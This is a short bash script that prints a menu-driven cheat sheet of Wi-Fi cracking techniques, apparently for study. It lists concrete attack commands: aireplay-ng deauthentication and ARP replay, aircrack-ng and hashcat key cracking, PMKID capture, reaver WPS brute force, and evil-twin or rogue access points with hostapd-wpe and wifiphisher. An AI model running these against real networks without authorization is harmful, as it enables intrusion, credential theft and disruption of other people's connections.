#!/bin/bash

echo "Wi-Fi Cracking Concepts"
echo "-------------------------"
echo "Select a network type to view attack techniques:"
echo "1. Open (OPN)"
echo "2. WEP"
echo "3. WPA/WPA2-Personal (PSK)"
echo "4. WPA/WPA2-Enterprise (WPA-MGT)"
echo ""

read -p "Enter your choice [1-4]: " choice
echo ""

case $choice in
  1)
    echo "Open (OPN) Network Attacks:"
    echo "----------------------------"
    echo "Passive sniffing: airodump-ng, tcpdump"
    echo "ARP/DNS spoofing: ettercap, bettercap"
    echo "Captive portal injection: custom scripts or wifiphisher"
    ;;
  2)
    echo "WEP Network Attacks:"
    echo "----------------------"
    echo "Capture IVs: airodump-ng"
    echo "ARP Replay: aireplay-ng -3 -b <BSSID> -h <your MAC> wlan1"
    echo "Crack key: aircrack-ng <capture file>"
    ;;
  3)
    echo "WPA/WPA2-PSK Attacks:"
    echo "----------------------"
    echo "Handshake capture:"
    echo "  airodump-ng"
    echo "  aireplay-ng -0 10 -a <BSSID> -c <client> wlan1"
    echo "  aircrack-ng -w <wordlist> <capture.cap>"
    echo ""
    echo "PMKID attack:"
    echo "  hcxdumptool -i wlan1mon -o dump.pcapng --enable_status=1"
    echo "  hcxpcapngtool -o pmkid.hccapx dump.pcapng"
    echo "  hashcat -m 16800 pmkid.hccapx -a 0 <wordlist>"
    echo ""
    echo "WPS brute-force: reaver -i wlan1mon -b <BSSID> -vv"
    echo "Offline rainbow tables: cowpatty with precomputed PMKs"
    ;;
  4)
    echo "WPA/WPA2-Enterprise Attacks:"
    echo "------------------------------"
    echo "Evil Twin: hostapd-wpe, capture MSCHAPv2, crack with hashcat/asleap"
    echo "Rogue AP: hostapd-wpe or eaphammer, listen for probes, capture hashes"
    echo "MITM Downgrade: wifiphisher EAP-Relay"
    echo "Fake portal phishing: wifiphisher or custom HTML"
    ;;
  *)
    echo "Invalid choice. Exiting."
    ;;
esac
